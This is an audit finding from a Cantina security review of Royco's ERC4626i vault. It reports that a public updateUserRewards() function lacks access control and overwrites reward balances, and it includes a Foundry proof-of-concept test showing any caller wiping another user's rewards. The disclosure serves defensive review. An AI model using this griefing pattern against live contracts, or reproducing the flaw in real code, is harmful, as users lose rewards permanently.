---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/vault
protocol: "[[Royco]]"
auditors:
  - "[[Kurt Barry]]"
report: "https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf"
genome:
  - "[[missing-modifier]]"
  - "[[reward-theft]]"
  - "[[access-roles]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# User rewards can be permissionlessly erased 

- id: 46672
- impact: HIGH
- protocol: [[Royco]]
- reporter: Kurt Barry (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf

## Summary


The bug report states that the public method updateUserRewards() of a contract called ERC4626i has a flaw that allows any account to overwrite the rewards of another account. This can result in the loss of rewards for users, and the tokens associated with these rewards cannot be recovered. A proof of concept test has been provided to demonstrate this issue. The recommendation is to be careful when rewriting the contract to avoid reintroducing this bug. The developers have acknowledged the issue and stated that the contract is being rewritten.

## Details

## Context
(No context files were provided by the reviewer)

## Description
The public method `updateUserRewards()` of `ERC4626i` overwrites the previous value of the user's accumulated rewards:

```solidity
userData.accumulated = (balanceOf[user] * elapsed * _campaignData.rate) / WAD;
```

This function can be called on any account by any other account (no access control), allowing any account to erase any other account's rewards. In particular, two calls within the same block will set the affected account's rewards to zero. This function is also called for all user interactions that modify balances, so even without malicious actors, users will lose rewards accidentally unless they call `claim()` prior to any interaction in the same block. Rewards "erased" in this manner cannot be recovered, and the corresponding tokens are stuck in the contract.

## Proof of Concept 
This test can be added to `test/ERC4626i.t.sol`:

```solidity
function testRewardWiping() public {
    uint256 startTime = block.timestamp;
    uint256 duration = 2 * (7 days); // seconds
    uint256 incentiveAmount = 100 * duration; // rate is going to be 100/s
    ERC4626i iVault = testFactory.createIncentivizedVault(testVault);
    testFactory.updateReferralFee(testVault, 0);
    testFactory.updateProtocolFee(testVault, 0);
    MockERC20 rewardToken = new MockERC20("Reward Token", "REWARD");
    rewardToken.mint(address(this), incentiveAmount);
    rewardToken.approve(address(iVault), incentiveAmount);
    uint256 campaignId = iVault.createRewardsCampaign(rewardToken, startTime, startTime + duration, incentiveAmount);
    
    address user1 = address(0x1337);
    uint256 deposit1 = 10e18;
    MockERC20(address(token)).mint(user1, deposit1);
    vm.startPrank(user1);
    token.approve(address(iVault), deposit1);
    iVault.deposit(deposit1, user1);
    iVault.optIntoCampaign(campaignId, /* referral */ address(0));
    vm.stopPrank();
    
    vm.warp(startTime + 1 * (7 days)); // warp halfway through campaign
    
    // This will cause the user's rewards to get wiped out on their next interaction.
    // Note that the caller is not user1. I.e. any address can wipe the rewards of
    // any other address. Commenting out this line makes the test pass instead of fail.
    iVault.updateUserRewards(campaignId, user1);
    vm.startPrank(user1);
    
    // This will invoke `updateUserRewards(campaignId, user1)` a second time within the block, zeroing rewards.
    uint256 claimedByUser1 = iVault.claim(campaignId, user1);
    vm.stopPrank();
    assertGt(claimedByUser1, 0);
}
```

## Recommendation
Given that the reward distribution algorithm is fundamentally flawed anyway (see the issue "Reward distribution algorithm is flawed"), the recommendation is to take care to not reintroduce this sort of bug during the rewrite. Advice on a correct implementation is given in the referenced finding.

## Royco
Acknowledged. Won't fix: `ERC4626i` is being rewritten entirely.

## Cantina Managed
Acknowledged.
